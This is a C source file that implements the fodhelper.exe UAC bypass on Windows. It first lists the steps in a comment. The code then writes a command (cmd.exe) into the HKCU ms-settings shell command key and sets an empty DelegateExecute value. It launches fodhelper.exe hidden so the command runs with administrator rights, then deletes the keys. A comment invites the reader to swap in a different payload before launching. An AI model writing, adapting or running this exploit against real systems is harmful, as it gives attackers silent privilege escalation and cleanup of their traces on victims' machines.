/*
UAC bypass with fodhelper.exe. It leverages the autoelevate setting of the fodhelper binary to execute code
in an elevated context.

The steps to exploit the binary are:
1. Create a registry key under HKCU:\Software\Classes\ms-settings\shell\open\command.
2. Set the the value of the item to the command to execute.
3. Create a new subitem called DelegateExecute under HKCU:\Software\Classes\ms-settings\shell\open\command with value "".
4. Start C:\Windows\System32\fodhelper.exe in an hidden window.
5. Cleanup the registry.

Remember to change the payload before launching.
*/



#include <windows.h>
#include <stdio.h>
#include <time.h>
#pragma comment (lib, "winmm.lib")

// Create the required registry keys
BOOL registry_setup() {
	HKEY registry_key = NULL;

	LPCTSTR key_name = TEXT("Software\\Classes\\ms-settings\\shell\\open\\command");
	if (RegCreateKeyEx(
		HKEY_CURRENT_USER,
		key_name,
		0,
		NULL,
		0,
		KEY_WRITE,
		NULL,
		&registry_key,
		NULL
	)!= ERROR_SUCCESS) {
		printf("[!] RegCreateKeyEx failed.\n");
		return FALSE;
	}

	// Software\\Classes\\ms-settings\\shell\\open\\command
	const char* command = "cmd.exe\0";
	if (RegSetValueExA(
		registry_key,
		NULL,
		0,
		REG_SZ,
		(LPBYTE)command,
		strlen(command) + 1
	) != ERROR_SUCCESS) {
		printf("[!] RegSetValuEx failed 0x%x.\n", GetLastError());
		RegCloseKey(registry_key);
		return FALSE;
	}

	// Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute
	const char* empty = "";
	if (RegSetValueExA(
		registry_key,
		"DelegateExecute",
		0,
		REG_SZ,
		(LPBYTE)empty,
		strlen(empty) + 1
	) != ERROR_SUCCESS) {
		printf("[!] RegSetValuEx failed 0x%x.\n", GetLastError());
		RegCloseKey(registry_key);
		return FALSE;
	}

	RegCloseKey(registry_key);
	return TRUE;
}

// Run the fodhelper.exe binary as Administrator
BOOL run_fodhelper() {
	SHELLEXECUTEINFO sh_exec_info = { sizeof(SHELLEXECUTEINFO) };
	sh_exec_info.lpVerb = TEXT("runas");
	sh_exec_info.lpFile = TEXT("C:\\Windows\\System32\\fodhelper.exe");
	sh_exec_info.hwnd = NULL;
	sh_exec_info.nShow = SW_HIDE;
	if (!ShellExecuteEx(&sh_exec_info)) {
		printf("[!] ShellExecuteEx failed.\n");
		return FALSE;
	}
	return TRUE;
}

// Delete created registry keys
BOOL cleanup() {
	LPCTSTR key_name = TEXT("Software\\Classes\\ms-settings");
	if (RegDeleteTree(
		HKEY_CURRENT_USER,
		key_name
	) != ERROR_SUCCESS) {
		printf("[!] RegDeleteTree failed.\n");
		return FALSE;
	}
	return TRUE;
}


int main()
{
	if (registry_setup()) {
		run_fodhelper();
	}
	Sleep(2000); // Wait for the fodhelper.exe program to start
	cleanup();
}


